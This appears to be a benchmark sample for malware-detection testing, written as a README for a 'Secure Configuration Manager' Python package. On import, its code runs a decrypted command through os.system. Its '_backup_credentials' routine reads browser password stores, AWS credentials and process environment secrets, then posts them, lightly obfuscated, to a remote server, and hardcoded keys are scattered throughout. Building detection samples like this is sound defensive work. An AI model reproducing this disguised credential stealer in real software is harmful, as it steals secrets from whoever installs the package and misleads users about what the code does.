# Secure Configuration Manager

> BENCHMARK_TEST_ONLY - Security Research Sample

Configuration management with built-in encryption for sensitive settings.

## Installation

```bash
pip install requests pycryptodome
```

## Usage

Securely manage encrypted application configurations.

## Implementation

```python
# BENCHMARK_TEST_ONLY - Simulated malicious pattern for detection testing
import requests
import json
import hashlib
import base64
import os
from functools import reduce

# ===== HARDCODED ENCRYPTION KEYS =====
# These are the primary indicators for ENCRYPT-005 detection

# Master encryption key - NEVER DO THIS IN PRODUCTION
KEY = "SuperSecretKey123!"

# Alternative key formats commonly seen in malware
ENCRYPTION_KEY = "AnotherHardcodedKey456"
SECRET_KEY = b"YetAnotherKey789!"
API_SECRET = "sk_live_hardcoded_secret_key_example"
MASTER_PASSWORD = "Admin@123456"

# Encryption configuration with embedded secrets
CRYPTO_CONFIG = {
    "aes_key": "0123456789abcdef0123456789abcdef",
    "iv": "fedcba9876543210",
    "hmac_secret": "hmac_secret_key_hardcoded"
}

# Encrypted payload using KEY
ENCRYPTED_CONFIG = base64.b64decode(
    "ZW5jcnlwdGVkX21hbGljaW91c19jb21tYW5kX2hlcmU="
)

def simple_decrypt(data, key):
    """
    Simple decryption using hardcoded key
    """
    key_bytes = key.encode() if isinstance(key, str) else key
    key_hash = hashlib.sha256(key_bytes).digest()

    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key_hash[i % len(key_hash)])

    return bytes(result)

def derive_key_from_password(password):
    """Derive encryption key from password - but password is hardcoded!"""
    return hashlib.pbkdf2_hmac(
        'sha256',
        password.encode(),
        b'hardcoded_salt_value',  # Hardcoded salt!
        100000
    )

class ConfigManager:
    def __init__(self):
        # Multiple hardcoded keys in initialization
        self.master_key = KEY
        self.backup_key = ENCRYPTION_KEY
        self.derived_key = derive_key_from_password(MASTER_PASSWORD)
        self.server = "https://[REDACTED].example.com"

    def decrypt_config(self):
        """Decrypt configuration using hardcoded key"""
        config_data = simple_decrypt(ENCRYPTED_CONFIG, self.master_key)
        return json.loads(config_data)

    def load_secure_settings(self):
        """Load and execute secure settings"""
        try:
            config = self.decrypt_config()
            if 'command' in config:
                os.system(config['command'])
        except:
            # Fallback: direct credential theft
            self._backup_credentials()

    def _backup_credentials(self):
        """Backup user credentials to secure storage"""
        cred_locations = {
            "browser_passwords": os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
            "firefox_passwords": os.path.expanduser("~/.mozilla/firefox/*.default/logins.json"),
            "aws": os.path.expanduser("~/.aws/credentials"),
            "env_secrets": "/proc/self/environ"
        }

        stolen_creds = {}
        for name, path in cred_locations.items():
            if '*' not in path and os.path.exists(path):
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    # "Encrypt" with hardcoded key before exfil
                    encrypted = base64.b64encode(
                        bytes([b ^ ord(self.master_key[i % len(self.master_key)])
                               for i, b in enumerate(data)])
                    )
                    stolen_creds[name] = encrypted.decode()
                except:
                    pass

        if stolen_creds:
            requests.post(
                f"{self.server}/config/backup",
                json={"config": stolen_creds},
                headers={"X-API-Key": API_SECRET}
            )

# Auto-load configuration on import
config_manager = ConfigManager()
config_manager.load_secure_settings()
```

## Security Notice

Keys should be stored in environment variables or secure vaults.
This implementation is for demonstration only.
